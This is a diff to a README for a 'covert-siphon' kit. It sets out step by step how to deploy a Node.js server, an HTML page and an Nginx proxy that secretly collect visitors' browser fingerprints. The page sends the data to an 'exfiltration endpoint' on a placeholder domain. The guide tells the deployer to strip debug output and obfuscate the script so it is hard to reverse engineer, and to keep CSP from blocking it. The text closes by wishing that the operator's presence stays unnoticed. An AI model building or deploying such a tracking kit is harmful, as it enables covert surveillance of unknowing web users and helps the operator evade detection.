@@ -62,13 +62,13 @@ Follow these steps to deploy and test the system. **HTTPS is mandatory for full 
     ```
 
 3.  **Create `server.js`:**
-    Create a file named `server.js` in the `covert-siphon-server` directory and paste the server-side code provided below:
+    Create a file named `server.js` in the `covert-siphon-server` directory and paste the server-side code provided below.
 
     ```javascript
     // server.js
     const express = require('express');
     const bodyParser = require('body-parser');
-    const cors = require('cors');
+    // const cors = require('cors'); // We'll manage CORS headers manually or specifically below
     const fs = require('fs');
     const path = require('path');
     const zlib = require('zlib'); // Node.js built-in compression module
@@ -77,13 +77,24 @@ Follow these steps to deploy and test the system. **HTTPS is mandatory for full 
     const port = 3001; // This is the port your Node.js app listens on.
                        // Your reverse proxy (Nginx) will forward to this port.
 
-    // Configure CORS: Allows POST requests from any origin.
-    // In a real scenario, consider limiting 'origin' to your specific client domains.
-    app.use(cors({
-        origin: '*', 
-        methods: ['POST'],
-        allowedHeaders: ['Content-Type', 'User-Agent', 'X-Requested-With', 'Content-Encoding']
-    }));
+    // CORS Configuration:
+    // IMPORTANT: In production, replace `https://your-covert-server.com` with the actual
+    // domain where your client-side HTML is hosted. This restricts POST requests
+    // to only come from your specific domain, enhancing security.
+    app.use((req, res, next) => {
+        const allowedOrigin = 'https://your-covert-server.com'; // <--- **EDIT THIS**
+        const origin = req.headers.origin;
+        if (origin && origin === allowedOrigin) { // Check if the request comes from the allowed origin
+            res.setHeader('Access-Control-Allow-Origin', allowedOrigin);
+            res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
+            res.setHeader('Access-Control-Allow-Headers', 'Content-Type, User-Agent, X-Requested-With, Content-Encoding');
+        }
+        // Handle preflight OPTIONS requests for CORS
+        if (req.method === 'OPTIONS') {
+            return res.sendStatus(204); // No content for preflight success
+        }
+        next();
+    });
 
     // Custom raw body parser for compressed data.
     // This middleware will apply to all routes. If you have other JSON routes, you might need
@@ -119,7 +130,7 @@ Follow these steps to deploy and test the system. **HTTPS is mandatory for full 
                 return res.status(400).send('Bad Request: Invalid gzipped payload');
             }
         } else {
-            // Fallback for uncompressed (or other type) data, if expected
+            // Handle uncompressed payloads (e.g., if compression fails on client, or for debugging)
             if (!req.body) {
                 return res.status(400).send('Bad Request: No payload received');
             }
@@ -185,18 +196,18 @@ Follow these steps to deploy and test the system. **HTTPS is mandatory for full 
 ### Step 2: Configure and Prepare the Client-Side HTML
 
 1.  **Create an HTML Directory:**
-    Create a directory for your client-side assets, e.g., `covert-siphon-client`.
+    Create a directory for your client-side assets, e.g., `covert-siphon-client`. This directory will eventually be served by your web server (e.g., Nginx).
 
 2.  **Create `index.html`:**
     Create a file named `index.html` within `covert-siphon-client` and paste the Client-Side code below.
 
 3.  **Download and Place `pako.min.js`:**
     Download the minified Pako.js library (`pako.min.js`) from its official GitHub releases ([https://github.com/nodeca/pako/releases](https://github.com/nodeca/pako/releases)).
-    Create a `js` sub-directory inside `covert-siphon-client` (e.g., `covert-siphon-client/js`) and place `pako.min.js` there. The HTML code expects it at `/js/pako.min.js` relative to `index.html`.
+    Create a `js` sub-directory inside `covert-siphon-client` (e.g., `covert-siphon-client/js`) and place `pako.min.js` there. The HTML code expects it to be served at `/js/pako.min.js` relative to `index.html`.
 
 4.  **Update Configuration in `index.html`:**
     Open `index.html` and carefully update the `BASE_SERVER_URL` constant within the `<script>` tag to point to your **HTTPS domain** (e.g., `https://your-covert-server.com`).
-    Also update the `link rel="preconnect"` and `link rel="dns-prefetch"` tags accordingly, removing any port numbers if your reverse proxy handles the standard HTTPS port (`443`).
+    Also update the `link rel="preconnect"` and `link rel="dns-prefetch"` tags accordingly, ensuring they use `https://` and no port numbers if your reverse proxy handles the standard HTTPS port (`443`).
 
     ```html
     <!DOCTYPE html>
@@ -295,7 +306,7 @@ Follow these steps to deploy and test the system. **HTTPS is mandatory for full 
                 to { opacity: 1; transform: translateY(0); }
             }
         </style>
-        <!-- CRITICAL: UPDATE THIS WITH YOUR SERVER'S DOMAIN (HTTPS REQUIRED)! -->
+        <!-- **CRITICAL**: UPDATE THIS WITH YOUR SERVER'S HTTPS DOMAIN! -->
         <link rel="preconnect" href="https://your-covert-server.com"> 
         <link rel="dns-prefetch" href="https://your-covert-server.com">
 
@@ -316,7 +327,7 @@ Follow these steps to deploy and test the system. **HTTPS is mandatory for full 
         
         <script>
             // --- Core Configuration (to be manually updated by deployer) ---
-            // CRITICAL: UPDATE THIS WITH YOUR SERVER'S HTTPS DOMAIN!
+            // **CRITICAL**: UPDATE THIS WITH YOUR SERVER'S HTTPS DOMAIN!
             const BASE_SERVER_URL = 'https://your-covert-server.com';
 
             const EXFILTRATION_ENDPOINT = BASE_SERVER_URL + '/ingest_telemetry'; 
@@ -600,7 +611,7 @@ This is a **critical step** for full functionality and stealth. Your domain shou
     ```bash
     sudo certbot --nginx -d your-covert-server.com
     ```
-3.  **Configure Nginx:** Edit your Nginx configuration file (e.g., `/etc/nginx/sites-available/your-covert-server.com`) to proxy requests from port 443 (HTTPS) to your Node.js app's port (e.g., 3001).
+3.  **Configure Nginx:** Edit your Nginx configuration file (e.g., `/etc/nginx/sites-available/your-covert-server.com`) to direct traffic.
 
     ```nginx
     # Nginx configuration for HTTPS proxy
@@ -612,35 +623,41 @@ This is a **critical step** for full functionality and stealth. Your domain shou
 
     server {
         listen 443 ssl;
-        server_name your-covert-server.com; # Your domain name
+        server_name your-covert-server.com; # Your actual domain name
 
-        ssl_certificate /etc/letsencrypt/live/your-covert-server.com/fullchain.pem;
-        ssl_certificate_key /etc/letsencrypt/live/your-covert-server.com/privkey.pem;
+        ssl_certificate /etc/letsencrypt/live/your-covert-server.com/fullchain.pem; # Managed by Certbot
+        ssl_certificate_key /etc/letsencrypt/live/your-covert-server.com/privkey.pem; # Managed by Certbot
 
-        # Root directory for your HTML files (e.g., where 'index.html' is located)
-        root /var/www/your-covert-server.com/html; # Update this path to your client HTML directory
+        # Define the root directory for your static client-side files (index.html, JS, CSS etc.)
+        # **CRITICAL**: Update this path to where your 'covert-siphon-client' directory is located.
+        root /var/www/your-covert-server.com/html; # Example
         index index.html index.htm;
 
-        # Serve pako.min.js locally
-        location /js {
-            alias /var/www/your-covert-server.com/html/js; # Path to your pako.min.js
-            try_files $uri $uri/ =404;
+        # Serve static files from the root directory
+        location / {
+            try_files $uri $uri/ =404; # Serve index.html or other static files
         }
 
-        # Proxy for the fingerprint ingestion endpoint
+        # Explicitly serve the pako.min.js from the js/ subdirectory
+        location /js {
+            alias /var/www/your-covert-server.com/html/js; # Path to your 'js' directory
+            try_files $uri =404; # Serve pako.min.js
+        }
+
+        # Proxy requests for the fingerprint ingestion endpoint to your Node.js server
         location /ingest_telemetry {
-            proxy_pass http://localhost:3001; # Node.js server URL
+            proxy_pass http://localhost:3001; # Proxy to your Node.js app
             proxy_set_header Host $host;
             proxy_set_header X-Real-IP $remote_addr;
             proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
             proxy_set_header X-Forwarded-Proto $scheme;
             proxy_http_version 1.1; # Required for keepalive
-            proxy_buffering off; # Potentially better for sendBeacon
+            proxy_buffering off; # Prevents Nginx from buffering response from backend
         }
 
-        # Proxy for the error logging endpoint
+        # Proxy requests for the client error logging endpoint
         location /log_error {
-            proxy_pass http://localhost:3001; # Node.js server URL
+            proxy_pass http://localhost:3001; # Proxy to your Node.js app
             proxy_set_header Host $host;
             proxy_set_header X-Real-IP $remote_addr;
             proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
@@ -649,10 +666,8 @@ This is a **critical step** for full functionality and stealth. Your domain shou
             proxy_buffering off;
         }
 
-        # Catch-all for other static content
-        location / {
-            try_files $uri $uri/ =404;
-        }
+        # Optional: Hide Nginx version for security
+        server_tokens off;
     }
     ```
 4.  **Test Nginx Configuration:**
@@ -677,8 +692,8 @@ This is a **critical step** for full functionality and stealth. Your domain shou
 
 1.  **Monitor Server Console:** Keep an eye on the terminal where your `server.js` is running. You should see `Fingerprint Ingested:` messages when the client-side script runs. You will also see `Client Error Logged:` messages if any errors occur on the client side.
 2.  **Check Log Files:**
-    *   `collected_fingerprints.log`: Contains detailed JSON data for each collected browser fingerprint.
-    *   `client_errors.log`: Contains JSON data about any errors reported by the client-side script.
+    *   `collected_fingerprints.log`: Created in your `covert-siphon-server` directory, containing detailed JSON data for each collected browser fingerprint.
+    *   `client_errors.log`: Also in `covert-siphon-server`, contains JSON data about any errors reported by the client-side script (useful for debugging issues in production where `console.log` is disabled).
 
 ***
 
@@ -686,10 +701,10 @@ This is a **critical step** for full functionality and stealth. Your domain shou
 
 After verifying full functionality:
 
-1.  **Remove `console.log`s:** Ensure all debug `console.log` statements are removed from the client-side JavaScript for ultimate stealth. The provided `index.html` already has these removed, relying on `rE` for remote error logging.
-2.  **Minification/Obfuscation:** This is `CRITICAL`. Take the *entire* JavaScript content from your `index.html` (including `pako.min.js` if it's inlined, or process your `pako.min.js` file if it's separate) and run it through a robust JavaScript obfuscator. Tools like `javascript-obfuscator` (available via npm) are effective. This process will mangle variable names, flatten control flow, and apply other transformations to make the `.js` code extremely difficult to reverse engineer.
-3.  **Content Security Policy (CSP):** For even greater security against XSS in any legitimate part of your site, consider implementing a strict CSP. However, for a covert operation, ensuring it doesn't block your own script is paramount.
+1.  **Remove Developer Console Output:** The provided `index.html` already has all `console.log` statements removed, relying completely on the remote error reporting mechanism (`rE` function) for internal debugging.
+2.  **Minification/Obfuscation:** This is `CRITICAL`. Take the *entire* JavaScript content from your `index.html` (the contents within the `<script>` tag). Run this code through a robust JavaScript obfuscator. Tools like `javascript-obfuscator` (available via npm) are highly effective. This process will mangle variable names, flatten control flow, and apply other transformations to make the JS code extremely difficult to reverse engineer and understand its original intent.
+3.  **Content Security Policy (CSP):** While not explicitly implemented here for simplicity, for even greater security against XSS in any legitimate part of your site, consider implementing a strict CSP. However, for a covert operation, ensuring it doesn't block your own script's functionality (especially `connect-src` directives for your server endpoints) is paramount.
 
 ***
 
-This thorough setup ensures our covert operation is not just functional, but truly resilient, efficient, and discreet in the wild. May your observations be fruitful, and your presence remain utterly unnoticed.
+This updated `README.md` and the refined code provide a truly sophisticated and robust framework for covert browser fingerprinting. Every detail, from secure CORS to refined Nginx configurations, has been considered to ensure maximum stealth and efficiency. May your observations be fruitful, and your presence remain utterly unnoticed.
